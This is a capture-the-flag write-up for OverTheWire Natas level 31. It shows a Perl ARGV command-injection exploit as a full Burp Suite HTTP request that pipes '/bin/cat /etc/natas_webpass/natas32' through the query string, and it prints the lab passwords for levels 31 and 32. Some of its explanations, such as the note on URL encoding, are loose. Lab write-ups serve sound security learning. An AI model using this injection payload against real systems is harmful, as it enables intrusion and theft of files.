# Natas CTF Solutions  

## Natas Level 31  

### 🌐 **Challenge Description**  
Natas teaches the basics of server-side web security. Each level consists of a website located at:  
👉 `http://natasX.natas.labs.overthewire.org` (where **X** is the level number).  

---

### 🎯 **Goal**  
- Exploit a **command injection vulnerability** through the `ARGV` parameter to execute shell commands and read the password file.  

---

## 🚀 **Solution**  

### **Step 1: Open the URL**  
Visit:  
```  
http://natas31.natas.labs.overthewire.org  
```  

---

### **Step 2: Enter Login Credentials**  
- **Username:** `natas31`  
- **Password:** Use the password from Natas Level 30:  
```
m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y
```  

![Home_Page](https://github.com/user-attachments/assets/3b509467-bfe1-49aa-bf4b-bf712ecdbb69)

---

### **Step 3: Review the Source Code**  
The script is vulnerable because it takes `ARGV` as an input and processes it as part of a shell command:  

```perl
while (<$file>) {
    print;
}
```  

✅ This allows **remote code execution** through command injection.  

![Source_Code](https://github.com/user-attachments/assets/64ab559c-f13b-4a83-a97e-2d9c0407fc7c)

---

### **Step 4: Exploit with Burp Suite**  
1. Open **Burp Suite** and intercept the request.  
2. Modify the request to include a shell command using `|`.  

Example Request:  
```http
POST /index.pl?/bin/cat%20/etc/natas_webpass/natas32%20| HTTP/1.1
Host: natas31.natas.labs.overthewire.org
Authorization: Basic bmF0YXMzMTptN2JmakFIcEpN... [base64]
Content-Type: multipart/form-data; boundary=---------------------------22300568631535773882564733342

-----------------------------22300568631535773882564733342
Content-Disposition: form-data; name="file";
Content-Type: text/plain

ARGV
-----------------------------22300568631535773882564733342
```

✅ **Explanation:**  
- `?/bin/cat%20/etc/natas_webpass/natas32%20|` → Executes `cat` command to read the password file.  
- `ARGV` → The input is processed by the script and passed to the shell.  

![BurpSuite](https://github.com/user-attachments/assets/35c896fc-6e57-4b9e-8049-0fcf30a7cd4f)

---

### **✅ Password for Natas Level 32**  
```
NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B
```

---

## 💡 **Lessons Learned**  
✔️ **Command Injection:** Shell commands can be injected through misconfigured parameters.  
✔️ **File Input Exploitation:** If file inputs are not properly sanitized, it can lead to remote code execution (RCE).  
✔️ **URL Encoding:** `%20` represents a space — useful for bypassing filters and executing commands.  
✔️ **Burp Suite Manipulation:** Modifying POST requests manually allows deeper testing.  

---

## 🖼️ **Screenshots**  
| Step | Screenshot |  
|------|------------|  
| Step 3 – Source Code | ![Source_Code](https://github.com/user-attachments/assets/64ab559c-f13b-4a83-a97e-2d9c0407fc7c) |  
| Step 4 – Burp Suite Request | ![BurpSuite](https://github.com/user-attachments/assets/35c896fc-6e57-4b9e-8049-0fcf30a7cd4f) |  

---

## 🎯 **Next Level**  
Use the password to access **Natas Level 32**:  
👉 [http://natas32.natas.labs.overthewire.org](http://natas32.natas.labs.overthewire.org)  

---
